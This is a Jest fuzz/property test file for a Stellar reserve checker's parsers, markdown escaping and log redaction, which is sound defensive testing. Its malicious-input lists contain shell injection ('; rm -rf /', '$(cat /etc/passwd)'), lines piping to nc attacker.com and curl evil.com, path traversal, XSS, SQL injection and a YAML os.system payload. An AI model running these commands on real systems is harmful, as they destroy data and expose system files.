/**
 * Wave #39: Benchmark parser fuzz property tests
 * 
 * Comprehensive fuzz/property testing for parser functions across:
 * - HTTP mocks (Horizon responses, error payloads)
 * - e2e harness (multi-step validation flows)
 * - Snapshot testing (comment formatting, error messages)
 * 
 * Tests cover boundary cases, malformed inputs, injection attempts,
 * and performance benchmarks for parser resilience.
 */

import {
  parseMinXlmReserve,
  isValidStellarAddress,
  normalizeStellarAddress,
  validateStellarAddress,
  formatXlmDeficit,
  buildReserveRequirement,
} from '../src/checks';
import { parseHorizonBalance, normalizeHorizonUrl } from '../src/horizon';
import { parseSimpleYaml } from '../src/configReader';
import { escapeMarkdownInline, inlineCode } from '../src/markdown';
import { parseBooleanInput, parseNumberInput } from '../src/inputs';
import { redactStellarAddress, redactString, redactHorizonUrl } from '../src/logger';

// ---------------------------------------------------------------------------
// Fuzz input generators
// ---------------------------------------------------------------------------

/** Generate random alphanumeric strings with varying lengths */
function randomAlphanumeric(length: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

/** Generate malicious/boundary-case strings for injection testing */
function generateMaliciousStrings(): string[] {
  return [
    // Shell injection
    '; rm -rf /',
    '`whoami`',
    '$(cat /etc/passwd)',
    '| nc attacker.com 1234',
    '& curl evil.com',
    
    // Path traversal
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    
    // XSS / Markdown injection
    '<script>alert("xss")</script>',
    '[click me](javascript:alert(1))',
    '](https://evil.com)',
    '**bold** `code` [link](url)',
    
    // Special characters
    '\n\r\t\0',
    '\x00\x01\x02',
    '\\n\\r\\t',
    
    // Unicode edge cases
    '🚀💰🌟',
    '\u0000',
    '\ufeff', // BOM
    
    // SQL injection (not relevant but good coverage)
    "'; DROP TABLE accounts; --",
    "' OR '1'='1",
    
    // Long strings
    'A'.repeat(1000),
    'A'.repeat(10000),
    
    // Empty/whitespace
    '',
    '   ',
    '\t\n\r',
  ];
}

/** Generate Stellar address variants for boundary testing */
function generateAddressVariants(): Array<{ input: string; valid: boolean }> {
  const validBase = 'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF';
  const validAlt = 'GAAQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQCAIBAEAQDZ7H';
  
  return [
    // Valid cases (checksum-valid StrKeys only)
    { input: validBase, valid: true },
    { input: `  ${validBase}  `, valid: true }, // with whitespace
    { input: validAlt, valid: true },
    
    // Invalid checksum despite shape
    { input: 'G' + 'A'.repeat(55), valid: false },
    { input: 'G' + '2'.repeat(55), valid: false },
    { input: 'G' + '7'.repeat(55), valid: false },
    
    // Invalid prefix
    { input: 'A' + validBase.slice(1), valid: false },
    { input: 'S' + validBase.slice(1), valid: false },
    // Contract address (Soroban) — valid shape, validated separately by
    // validateContractAddress(). Contract addresses carry no ed25519 version
    // byte, so they are checked structurally rather than by pubkey checksum.
    { input: 'C' + validBase.slice(1), valid: true },
    { input: 'C' + 'A'.repeat(54), valid: false }, // too short
    { input: 'C' + '0'.repeat(55), valid: false }, // not base32
    { input: 'c' + validBase.slice(1), valid: false }, // lowercase prefix
    
    // Invalid length
    { input: 'G', valid: false },
    { input: 'GA', valid: false },
    { input: 'G' + 'A'.repeat(54), valid: false },
    { input: 'G' + 'A'.repeat(56), valid: false },
    { input: 'G' + 'A'.repeat(100), valid: false },
    
    // Invalid characters (not base32)
    { input: 'G' + '0'.repeat(55), valid: false },
    { input: 'G' + '1'.repeat(55), valid: false },
    { input: 'G' + '8'.repeat(55), valid: false },
    { input: 'G' + '9'.repeat(55), valid: false },
    { input: 'G' + 'a'.repeat(55), valid: false }, // lowercase
    
    // Special characters
    { input: validBase.slice(0, 28) + '@' + validBase.slice(29), valid: false },
    { input: validBase.slice(0, 28) + ' ' + validBase.slice(29), valid: false },
    
    // Empty/null
    { input: '', valid: false },
    { input: '   ', valid: false },
  ];
}

/** Generate numeric input variants for boundary testing */
function generateNumericVariants(): Array<{ input: string; valid: boolean; expected?: number }> {
  return [
    // Valid cases
    { input: '0', valid: true, expected: 0 },
    { input: '1.5', valid: true, expected: 1.5 },
    { input: '100', valid: true, expected: 100 },
    { input: '  2.5  ', valid: true, expected: 2.5 },
    { input: '0.0000001', valid: true, expected: 0.0000001 },
    { input: '999999.999999', valid: true, expected: 999999.999999 },
    
    // Invalid cases
    { input: '-1', valid: false },
    { input: '-0.5', valid: false },
    { input: 'abc', valid: false },
    { input: '1.2.3', valid: false },
    { input: 'Infinity', valid: false },
    { input: 'NaN', valid: false },
    { input: '', valid: false },
    { input: '   ', valid: false },
    { input: '1e308', valid: true, expected: 1e308 }, // large but finite
    { input: '1e309', valid: false }, // would be Infinity
  ];
}

// ---------------------------------------------------------------------------
// Property tests: parseMinXlmReserve
// ---------------------------------------------------------------------------

describe('parseMinXlmReserve - fuzz property tests', () => {
  it('accepts all valid numeric strings within reasonable bounds', () => {
    const validInputs = generateNumericVariants().filter(v => v.valid);
    
    for (const { input, expected } of validInputs) {
      const result = parseMinXlmReserve(input);
      expect(Number(result)).toBe(expected);
      expect(Number.isFinite(Number(result))).toBe(true);
      expect(Number(result)).toBeGreaterThanOrEqual(0);
    }
  });
  
  it('rejects all invalid numeric strings', () => {
    const invalidInputs = generateNumericVariants().filter(v => !v.valid);
    
    for (const { input } of invalidInputs) {
      expect(() => parseMinXlmReserve(input)).toThrow(/min_xlm_reserve/i);
    }
  });
  
  it('handles edge case decimal precision without rounding errors', () => {
    const preciseValue = '1.23456789012345';
    const result = parseMinXlmReserve(preciseValue);
    expect(result.toString()).toContain('1.234567890');
  });
  
  it('rejects malicious injection attempts in numeric input', () => {
    const malicious = [
      '1.5; rm -rf /',
      '$(whoami)',
      '1.5`id`',
      '1.5\nmalicious',
    ];
    
    for (const input of malicious) {
      expect(() => parseMinXlmReserve(input)).toThrow();
    }
  });
});

// ---------------------------------------------------------------------------
// Property tests: Stellar address validation
// ---------------------------------------------------------------------------

describe('isValidStellarAddress - fuzz property tests', () => {
  it('validates all address variants correctly', () => {
    const variants = generateAddressVariants();
    
    for (const { input, valid } of variants) {
      const result = isValidStellarAddress(input);
      expect(result).toBe(valid);
    }
  });
  
  it('handles random alphanumeric strings without crashing', () => {
    for (let i = 0; i < 100; i++) {
      const length = Math.floor(Math.random() * 200) + 1;
      const random = randomAlphanumeric(length);
      const result = isValidStellarAddress(random);
      expect(typeof result).toBe('boolean');
    }
  });
  
  it('rejects all malicious string patterns', () => {
    for (const malicious of generateMaliciousStrings()) {
      expect(isValidStellarAddress(malicious)).toBe(false);
    }
  });
});

describe('validateStellarAddress - fuzz property tests', () => {
  it('throws descriptive errors for all invalid variants', () => {
    const invalidVariants = generateAddressVariants().filter(v => !v.valid);
    
    for (const { input } of invalidVariants) {
      expect(() => validateStellarAddress(input)).toThrow();
    }
  });
  
  it('does not throw for valid addresses', () => {
    const validVariants = generateAddressVariants().filter(v => v.valid);
    
    for (const { input } of validVariants) {
      expect(() => validateStellarAddress(input)).not.toThrow();
    }
  });
});

describe('normalizeStellarAddress - fuzz property tests', () => {
  it('always trims whitespace consistently', () => {
    const testCases = [
      '  GABC  ',
      '\tGABC\t',
      '\nGABC\n',
      '  \t GABC \n ',
    ];
    
    for (const input of testCases) {
      expect(normalizeStellarAddress(input)).toBe('GABC');
    }
  });
});

// ---------------------------------------------------------------------------
// Property tests: parseHorizonBalance
// ---------------------------------------------------------------------------

describe('parseHorizonBalance - fuzz property tests', () => {
  it('parses valid Horizon balance strings correctly', () => {
    const validBalances = [
      '0.0000000',
      '1.5000000',
      '100.0000000',
      '999999.9999999',
      '0.0000001',
    ];
    
    for (const balance of validBalances) {
      const result = parseHorizonBalance(balance);
      expect(Number.isFinite(result)).toBe(true);
      expect(result).toBeGreaterThanOrEqual(0);
    }
  });
  
  it('returns 0 for non-numeric balance strings without throwing', () => {
    // parseHorizonBalance returns 0 only for non-finite / non-parseable strings.
    // Negative numbers ARE finite and are returned as-is (the caller decides validity).
    const nonNumeric = [
      'not-a-number',
      '',
      'NaN',
      'Infinity',
      '1.2.3',
      '; rm -rf /',
      '`whoami`',
      '<script>',
      '\n\r',
    ];
    
    for (const balance of nonNumeric) {
      const result = parseHorizonBalance(balance);
      expect(result).toBe(0);
    }
  });

  it('returns the numeric value as-is for finite negative strings', () => {
    // Negative balances are structurally valid numbers; higher-level checks
    // enforce non-negative semantics.
    expect(parseHorizonBalance('-1.0000000')).toBe(-1);
    expect(parseHorizonBalance('-0.5000000')).toBe(-0.5);
  });
});

// ---------------------------------------------------------------------------
// Property tests: normalizeHorizonUrl
// ---------------------------------------------------------------------------

describe('normalizeHorizonUrl - fuzz property tests', () => {
  it('strips trailing slashes consistently', () => {
    const testCases = [
      { input: 'https://horizon.stellar.org/', expected: 'https://horizon.stellar.org' },
      { input: 'https://horizon.stellar.org///', expected: 'https://horizon.stellar.org' },
      { input: 'https://horizon.stellar.org', expected: 'https://horizon.stellar.org' },
    ];
    
    for (const { input, expected } of testCases) {
      expect(normalizeHorizonUrl(input)).toBe(expected);
    }
  });
  
  it('trims whitespace', () => {
    const input = '  https://horizon.stellar.org///  ';
    expect(normalizeHorizonUrl(input)).toBe('https://horizon.stellar.org');
  });
  
  it('handles empty and whitespace-only strings', () => {
    expect(normalizeHorizonUrl('')).toBe('');
    expect(normalizeHorizonUrl('   ')).toBe('');
  });
});

// ---------------------------------------------------------------------------
// Property tests: parseSimpleYaml
// ---------------------------------------------------------------------------

describe('parseSimpleYaml - fuzz property tests', () => {
  it('handles various quote styles consistently', () => {
    const testCases = [
      { input: 'key: value', expected: 'value' },
      { input: 'key: "value"', expected: 'value' },
      { input: "key: 'value'", expected: 'value' },
      { input: 'key: "val\'ue"', expected: "val'ue" },
    ];
    
    for (const { input, expected } of testCases) {
      const result = parseSimpleYaml(input);
      expect(result.key).toBe(expected);
    }
  });
  
  it('parses boolean values case-insensitively', () => {
    const booleanTests = [
      { input: 'flag: true', expected: true },
      { input: 'flag: TRUE', expected: true },
      { input: 'flag: True', expected: true },
      { input: 'flag: false', expected: false },
      { input: 'flag: FALSE', expected: false },
      { input: 'flag: False', expected: false },
    ];
    
    for (const { input, expected } of booleanTests) {
      const result = parseSimpleYaml(input);
      expect(result.flag).toBe(expected);
    }
  });
  
  it('handles malicious YAML injection attempts safely', () => {
    const malicious = [
      'key: !!python/object/apply:os.system ["rm -rf /"]',
      'key: &anchor value\nref: *anchor',
      'key: |+\n  multiline\n  not supported',
      'key: [array, not, supported]',
      'key: {nested: object}',
    ];
    
    for (const yaml of malicious) {
      // Should not crash; may return unexpected values but must be safe
      expect(() => parseSimpleYaml(yaml)).not.toThrow();
    }
  });
  
  it('strips inline comments correctly', () => {
    const result = parseSimpleYaml('key: value # this is a comment');
    expect(result.key).toBe('value');
    expect(result.key).not.toContain('#');
  });
});

// ---------------------------------------------------------------------------
// Property tests: Markdown escaping
// ---------------------------------------------------------------------------

describe('escapeMarkdownInline - fuzz property tests', () => {
  it('escapes all markdown special characters', () => {
    const specialChars = '`*_{}[]()#+!|>~';
    const escaped = escapeMarkdownInline(specialChars);
    
    for (const char of specialChars) {
      expect(escaped).toContain(`\\${char}`);
    }
    // Dots and hyphens are intentionally not escaped so domains/URLs stay readable.
    expect(escapeMarkdownInline('centre.io')).toBe('centre.io');
    expect(escapeMarkdownInline('kyc-example')).toBe('kyc-example');
  });
  
  it('handles malicious markdown injection attempts', () => {
    // Each entry in this table MUST contain [ and ( so the bracket assertions hold.
    const attacks = [
      '[click me](https://evil.com)',
      '![alt](https://evil.com/img.png)',
      '[link text](javascript:alert(1))',
      '**bold** [anchor](url)',
    ];
    
    for (const attack of attacks) {
      const escaped = escapeMarkdownInline(attack);
      expect(escaped).not.toContain('[click me](');
      expect(escaped).toContain('\\[');
      expect(escaped).toContain('\\]');
      expect(escaped).toContain('\\(');
      expect(escaped).toContain('\\)');
    }
  });

  it('escapes asterisks and underscores without needing brackets', () => {
    const emphasis = '**bold** _italic_';
    const escaped = escapeMarkdownInline(emphasis);
    expect(escaped).toContain('\\*');
    expect(escaped).toContain('\\_');
    expect(escaped).not.toContain('**bold**');
    expect(escaped).not.toContain('_italic_');
  });
  
  it('does not corrupt safe alphanumeric content', () => {
    const safe = 'USDC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    expect(escapeMarkdownInline(safe)).toBe(safe);
  });
});

describe('inlineCode - fuzz property tests', () => {
  it('escapes backticks to prevent code span breakout', () => {
    const malicious = 'value` [click](evil) `end';
    const result = inlineCode(malicious);
    
    expect(result).toContain('\\`');
    expect(result).not.toContain('` [click](evil) `');
  });
  
  it('wraps content in backticks', () => {
    const result = inlineCode('test');
    expect(result).toBe('`test`');
  });
});

// ---------------------------------------------------------------------------
// Property tests: Logger redaction
// ---------------------------------------------------------------------------

describe('redactStellarAddress - fuzz property tests', () => {
  it('redacts all valid G-addresses to first4...last4 format', () => {
    const addresses = [
      'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF',
      'GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB',
      'G' + '2'.repeat(55),
      'G' + '7'.repeat(55),
    ];
    
    for (const addr of addresses) {
      const redacted = redactStellarAddress(addr);
      expect(redacted).toBe(`${addr.slice(0, 4)}...${addr.slice(-4)}`);
      expect(redacted.length).toBe(11); // 4 + 3 + 4
    }
  });
  
  it('redacts C-addresses (contract) the same way', () => {
    const contractAddr = 'C' + 'A'.repeat(55);
    const redacted = redactStellarAddress(contractAddr);
    expect(redacted).toBe(`${contractAddr.slice(0, 4)}...${contractAddr.slice(-4)}`);
  });
  
  it('does not modify invalid addresses', () => {
    const invalid = [
      'not-an-address',
      'G',
      'GA',
      'G' + 'A'.repeat(54), // too short
      'X' + 'A'.repeat(55), // wrong prefix
    ];
    
    for (const addr of invalid) {
      expect(redactStellarAddress(addr)).toBe(addr);
    }
  });
});

describe('redactString - fuzz property tests', () => {
  it('redacts embedded addresses in free-form text', () => {
    const text = 'Account GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF failed';
    const redacted = redactString(text);
    
    expect(redacted).not.toContain('GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF');
    expect(redacted).toContain('GAAA...AWHF');
  });
  
  it('redacts multiple addresses in the same string', () => {
    const text = 'Transfer from GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF to GBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    const redacted = redactString(text);
    
    expect(redacted).toContain('GAAA...AWHF');
    expect(redacted).toContain('GBBB...BBBB');
  });
});

describe('redactHorizonUrl - fuzz property tests', () => {
  it('redacts addresses in Horizon account URLs', () => {
    const url = 'https://horizon.stellar.org/accounts/GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF';
    const redacted = redactHorizonUrl(url);
    
    expect(redacted).not.toContain('GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF');
    expect(redacted).toContain('GAAA...AWHF');
    expect(redacted).toContain('https://horizon.stellar.org');
  });
});

// ---------------------------------------------------------------------------
// Property tests: parseBooleanInput
// ---------------------------------------------------------------------------

describe('parseBooleanInput - fuzz property tests', () => {
  it('accepts all truthy variants case-insensitively', () => {
    // Only the values the real parseBooleanInput recognises: true/1/yes (trimmed, lowercase)
    const truthy = ['true', 'TRUE', 'True', '1', 'yes', 'YES', 'Yes', ' yes ', ' 1 '];
    
    for (const input of truthy) {
      expect(parseBooleanInput(input, false)).toBe(true);
    }
  });
  
  it('accepts all falsy variants case-insensitively', () => {
    // Only the values the real parseBooleanInput recognises: false/0/no (trimmed, lowercase)
    const falsy = ['false', 'FALSE', 'False', '0', 'no', 'NO', 'No', ' no ', ' 0 '];
    
    for (const input of falsy) {
      expect(parseBooleanInput(input, true)).toBe(false);
    }
  });
  
  it('falls back to default for malformed input', () => {
    const malformed = ['maybe', '2', 'unknown', '', '  ', ...generateMaliciousStrings()];
    
    for (const input of malformed) {
      expect(parseBooleanInput(input, true)).toBe(true);
      expect(parseBooleanInput(input, false)).toBe(false);
    }
  });
});

// ---------------------------------------------------------------------------
// Property tests: parseNumberInput
// ---------------------------------------------------------------------------

describe('parseNumberInput - fuzz property tests', () => {
  it('enforces min boundary strictly', () => {
    expect(() => parseNumberInput('0', 100, { min: 1 })).toThrow(/at least 1/i);
    expect(() => parseNumberInput('0.999', 100, { min: 1 })).toThrow(/at least 1/i);
    expect(parseNumberInput('1', 100, { min: 1 })).toBe(1);
    expect(parseNumberInput('1.001', 100, { min: 1 })).toBe(1.001);
  });
  
  it('enforces max boundary strictly', () => {
    expect(() => parseNumberInput('101', 100, { max: 100 })).toThrow(/at most 100/i);
    expect(() => parseNumberInput('100.001', 100, { max: 100 })).toThrow(/at most 100/i);
    expect(parseNumberInput('100', 100, { max: 100 })).toBe(100);
    expect(parseNumberInput('99.999', 100, { max: 100 })).toBe(99.999);
  });
  
  it('rejects malicious input patterns', () => {
    for (const malicious of generateMaliciousStrings()) {
      if (malicious.trim()) {
        expect(() => parseNumberInput(malicious, 100)).toThrow();
      }
    }
  });
});

// ---------------------------------------------------------------------------
// Property tests: formatXlmDeficit and buildReserveRequirement
// ---------------------------------------------------------------------------

describe('formatXlmDeficit - fuzz property tests', () => {
  it('never returns negative values', () => {
    const testCases = [
      { required: 1.5, actual: 2.0 },
      { required: 1.5, actual: 1.5 },
      { required: 1.5, actual: 0 },
      { required: 0, actual: 0 },
      { required: 0, actual: 10 },
    ];
    
    for (const { required, actual } of testCases) {
      const deficit = formatXlmDeficit(required, actual);
      const parsed = parseFloat(deficit);
      expect(parsed).toBeGreaterThanOrEqual(0);
    }
  });
  
  it('formats with 7 decimal places (Stellar precision)', () => {
    const deficit = formatXlmDeficit(1.5, 1.0);
    expect(deficit).toMatch(/^\d+\.\d{7}$/);
  });
});

describe('buildReserveRequirement - fuzz property tests', () => {
  it('correctly determines met status for all boundary cases', () => {
    const cases = [
      { required: 1.5, actual: 2.0, shouldMeet: true },
      { required: 1.5, actual: 1.5, shouldMeet: true },
      { required: 1.5, actual: 1.4999999, shouldMeet: false },
      { required: 0, actual: 0, shouldMeet: true },
      { required: 0, actual: -1, shouldMeet: false },
    ];
    
    for (const { required, actual, shouldMeet } of cases) {
      const result = buildReserveRequirement(required, actual);
      expect(result.met).toBe(shouldMeet);
      expect(result.required).toBe(required);
      expect(result.actual).toBe(actual);
    }
  });
});

// ---------------------------------------------------------------------------
// Performance benchmark tests
// ---------------------------------------------------------------------------

describe('Parser performance benchmarks', () => {
  it('parseMinXlmReserve handles 10k iterations under 100ms', () => {
    const start = Date.now();
    
    for (let i = 0; i < 10000; i++) {
      parseMinXlmReserve('1.5');
    }
    
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(100);
  });
  
  it('isValidStellarAddress handles 10k iterations under 500ms', () => {
    const addr = 'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF';
    const start = Date.now();
    
    for (let i = 0; i < 10000; i++) {
      isValidStellarAddress(addr);
    }
    
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(500);
  });
  
  it('redactStellarAddress handles 10k iterations under 200ms', () => {
    const addr = 'GAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAWHF';
    const start = Date.now();
    
    for (let i = 0; i < 10000; i++) {
      redactStellarAddress(addr);
    }
    
    const elapsed = Date.now() - start;
    expect(elapsed).toBeLessThan(200);
  });
});
